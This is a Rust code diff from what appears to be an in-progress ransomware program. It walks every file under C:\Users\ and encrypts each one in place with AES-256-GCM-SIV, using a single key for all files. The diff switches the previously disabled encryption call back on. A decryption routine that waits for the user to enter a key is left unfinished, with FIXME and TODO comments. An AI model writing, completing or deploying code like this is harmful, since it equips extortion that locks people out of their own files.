@@ -68,7 +68,8 @@ fn main() {
         } else {
             let user_input_bytes = hex::decode(user_input_str).unwrap().to_owned();
 
-            let decrypt_key = GenericArray::clone_from_slice(&user_input_bytes.as_slice());
+            //FIXME: up to here today
+            // let decrypt_key = GenericArray::clone_from_slice(&user_input_bytes.as_slice());
         }
     }
 }
@@ -156,28 +157,22 @@ fn traverse(do_encrypt: bool, cipher: &Aes256GcmSiv) -> Result<(), Error> {
     for entry in WalkDir::new("C:\\Users\\").follow_links(true) {
         match entry {
             Ok(entry) => {
-                writeln!(
-                    //this is just debug code
-                    test_file.as_ref().unwrap(),
-                    "found file: {}",
-                    entry.path().display()
-                );
-                //FIXME: this is messing up the traversal. if somethinf doesnt work, skip it
-                //FIXME: herererer
-                if do_encrypt {
-                    // if let Err(err) = encrypt(entry.path(), cipher) {
-                    //     writeln!(
-                    //         test_file.as_ref().unwrap(),
-                    //         "Error encrypting file: {}",
-                    //         err
-                    //     );
-                    //     //move onto the next file
-                    //     continue;
-                    // }
+                if entry.file_type().is_file() {
+                    writeln!(
+                        //this is just debug code
+                        test_file.as_ref().unwrap(),
+                        "found file: {}",
+                        entry.path().display()
+                    );
+                    //FIXME: this is messing up the traversal. if somethinf doesnt work, skip it
+                    //FIXME: herererer
+                    if do_encrypt {
+                        encrypt(entry.path(), cipher);
 
-                    // encrypt(entry.path(), cipher);
-                } else {
-                    decrypt(entry.path(), cipher)?;
+                        // encrypt(entry.path(), cipher);
+                    } else {
+                        decrypt(entry.path(), cipher)?;
+                    }
                 }
             }
             Err(e) => {
@@ -192,14 +187,11 @@ fn traverse(do_encrypt: bool, cipher: &Aes256GcmSiv) -> Result<(), Error> {
  * Encrypt a file, using given path and the same key for all files
  * Use different nonce for each file, prepend to file
  */
-fn encrypt(path: &Path, cipher: &Aes256GcmSiv) -> Result<(), io::Error> {
+fn encrypt(path: &Path, cipher: &Aes256GcmSiv) -> Result<(), std::io::Error> {
     //open existing "C:\\Users\\win11\\Desktop\\output.txt" and write the path to it
     // Open a file with append option
-    let mut data_file = OpenOptions::new()
-        .append(true)
-        .open("C:\\Users\\win11\\Desktop\\output.txt")?;
-    // Write to a file
-    data_file.write(path.display().to_string().as_bytes())?;
+
+    println!("encrypting file: {}", path.display()); //FIXME: error testing
 
     let mut file = File::open(path)?;
     let mut buffer = Vec::new();
@@ -217,32 +209,51 @@ fn encrypt(path: &Path, cipher: &Aes256GcmSiv) -> Result<(), io::Error> {
     Ok(())
 }
 
+pub struct MyError {
+    message: String,
+}
+
+impl From<std::io::Error> for MyError {
+    fn from(err: std::io::Error) -> Self {
+        Self {
+            message: err.to_string(),
+        }
+    }
+}
+
+impl From<walkdir::Error> for MyError {
+    fn from(err: walkdir::Error) -> Self {
+        Self {
+            message: err.to_string(),
+        }
+    }
+}
+
 /**
  * Decrypt a file using a given key
+ * this is not finished. the main decryption is in main atm
  */
 fn decrypt(path: &Path, cipher: &Aes256GcmSiv) -> Result<(), Error> {
-    //
-    loop {
-        let mut user_input = String::new();
-        println!("Enter decryption key pls: ");
-        io::stdin().read_line(&mut user_input).unwrap();
-        let user_input_str = user_input.as_bytes(); //convert to bytes
+    //TODO: THIS CODE IS CURRENTLY IN THE MAIN FUNCTION
+    // loop {
+    //     let mut user_input = String::new();
+    //     println!("Enter decryption key pls: ");
+    //     io::stdin().read_line(&mut user_input).unwrap();
+    //     let user_input_str = user_input.as_bytes(); //convert to bytes
 
-        //TODO: UP TO HERE TODAY
-        //key length 32, nonce length 12
-        if user_input_str.len() != 32 {
-            //print error
-            println!("Invalid key length")
-        } else {
-            // //FIXME: convert byte array into key format why this no work
-            // //WHY THIS NO WORK
-            // let user_key = GenericArray::clone_from_slice(&user_input_str[0..32]);
-            // //decrypt using the key
-            // let plaintext = cipher.decrypt(nonce, ciphertext.unwrap().as_ref());
-        }
-        //only break the loop when the correct key is entered
-
-        //
-    }
+    //     //TODO: UP TO HERE TODAY
+    //     //key length 32, nonce length 12
+    //     if user_input_str.len() != 32 {
+    //         //print error
+    //         println!("Invalid key length")
+    //     } else {
+    //         // //FIXME: convert byte array into key format why this no work
+    //         // //WHY THIS NO WORK
+    //         // let user_key = GenericArray::clone_from_slice(&user_input_str[0..32]);
+    //         // //decrypt using the key
+    //         // let plaintext = cipher.decrypt(nonce, ciphertext.unwrap().as_ref());
+    //     }
+    //     //only break the loop when the correct key is entered
+    // }
     Ok(())
 }
